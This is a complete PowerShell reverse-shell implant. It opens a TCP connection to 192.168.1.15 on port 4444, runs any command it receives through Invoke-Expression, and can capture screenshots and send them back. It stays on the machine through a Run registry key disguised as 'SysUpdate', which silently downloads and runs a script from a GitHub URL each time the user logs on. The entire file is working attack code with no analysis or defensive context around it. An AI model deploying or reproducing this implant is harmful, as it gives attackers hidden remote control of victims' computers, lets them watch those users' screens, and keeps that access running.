$ip = '192.168.1.15'
$port = 4444

# Define the Screenshot function OUTSIDE the main logic to keep it clean
function Get-Screenshot {
    try {
        # Load assemblies ONLY when the command is called
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $base = [Convert]::ToBase64String($ms.ToArray())
        
        $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()
        return $base
    } catch {
        return "Screenshot Error: $($_.Exception.Message)"
    }
}

# START MAIN LOGIC
try {
    # 1. Attempt Persistence (Wrapped in try/catch so it won't kill the shell if it fails)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SysUpdate"
        if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
            $payload = "powershell.exe -W Hidden -NoP -C IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"
            New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        }
    } catch { 
        # Persistence failed, but we don't care, we want the shell!
    }

    # 2. Establish Connection
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    # Greeting
    $writer.WriteLine("--- Connection Secure: $($env:COMPUTERNAME) ---")
    $writer.Write("PS " + (Get-Location).Path + "> ")

    # 3. Execution Loop
    while($client.Connected) {
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        
        $cmd = $line.Trim()
        if ([string]::IsNullOrWhiteSpace($cmd)) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            continue
        }

        # Handle Exit
        if ($cmd -eq "exit") { break }

        # Logic Switch
        $output = if ($cmd -eq "screenshot") {
            Get-Screenshot
        } else {
            try { 
                Invoke-Expression $cmd 2>&1 | Out-String 
            } catch { 
                $_.Exception.Message 
            }
        }

        # Send result back
        $writer.WriteLine($output)
        $writer.Write("PS " + (Get-Location).Path + "> ")
    }

} catch {
    # This keeps the window open so you can see the error before it disappears
    Write-Host "FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Check if your listener is active at $ip`:$port"
    Start-Sleep -Seconds 5 
} finally {
    if ($client) { $client.Close() }
}
